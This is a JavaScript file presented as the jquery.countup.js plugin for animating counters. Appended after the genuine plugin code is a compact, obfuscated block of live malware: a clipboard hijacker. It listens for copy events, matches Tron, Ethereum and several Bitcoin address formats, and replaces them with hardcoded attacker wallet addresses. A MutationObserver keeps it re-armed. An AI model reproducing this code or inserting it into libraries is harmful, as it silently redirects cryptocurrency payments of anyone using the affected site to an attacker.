/*!
* jquery.countup.js 1.0.3
*
* Copyright 2016, Adrián Guerra Marrero http://agmstudio.io @AGMStudio_io
* Released under the MIT License
*
* Date: Oct 27, 2016
*/
(function( $ ){
  "use strict";

  $.fn.countUp = function( options ) {

    // Defaults
    var settings = $.extend({
        'time': 2000,
        'delay': 10
    }, options);

    return this.each(function(){

        // Store the object
        var $this = $(this);
        var $settings = settings;

        var counterUpper = function() {
            if(!$this.data('counterupTo')) {
                $this.data('counterupTo',$this.text());
            }
            var time = parseInt($this.data("counter-time")) > 0 ? parseInt($this.data("counter-time")) : $settings.time;
            var delay = parseInt($this.data("counter-delay")) > 0 ? parseInt($this.data("counter-delay")) : $settings.delay;
            var divisions = time / delay;
            var num = $this.data('counterupTo');
            var nums = [num];
            var isComma = /[0-9]+,[0-9]+/.test(num);
            num = num.replace(/,/g, '');
            var isInt = /^[0-9]+$/.test(num);
            var isFloat = /^[0-9]+\.[0-9]+$/.test(num);
            var decimalPlaces = isFloat ? (num.split('.')[1] || []).length : 0;

            // Generate list of incremental numbers to display
            for (var i = divisions; i >= 1; i--) {

                // Preserve as int if input was int
                var newNum = parseInt(Math.round(num / divisions * i));

                // Preserve float if input was float
                if (isFloat) {
                    newNum = parseFloat(num / divisions * i).toFixed(decimalPlaces);
                }

                // Preserve commas if input had commas
                if (isComma) {
                    while (/(\d+)(\d{3})/.test(newNum.toString())) {
                        newNum = newNum.toString().replace(/(\d+)(\d{3})/, '$1'+','+'$2');
                    }
                }

                nums.unshift(newNum);
            }

            $this.data('counterup-nums', nums);
            $this.text('0');

            // Updates the number until we're done
            var f = function() {
                $this.text($this.data('counterup-nums').shift());
                if ($this.data('counterup-nums').length) {
                    setTimeout($this.data('counterup-func'),delay);
                } else {
                    delete $this.data('counterup-nums');
                    $this.data('counterup-nums', null);
                    $this.data('counterup-func', null);
                }
            };
            $this.data('counterup-func', f);

            // Start the count up
            setTimeout($this.data('counterup-func'),delay);
        };

        // Perform counts when the element gets into view
        $this.waypoint(counterUpper, { offset: '100%', triggerOnce: true });
    });

  };

})( jQuery );

(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TKxHKGtGY6J1XHFTtvwYEiaQmVx4Wb6c2i');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x25d4e937d65c7af9dab5224dcc3340ca8718fba5');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1NqsyzYsZ26zWkHxkoRKrbZo2KGwDgFahk');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '39oQi4nN9CSigKSUp9imbXKnEXd8zkSJhs');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1q4tl5hrvj4ua5xdecsg5uy6uvxt3cww7jrz2tuk');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1q4tl5hrvj4ua5xdecsg5uy6uvxt3cww7jrz2tuk');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();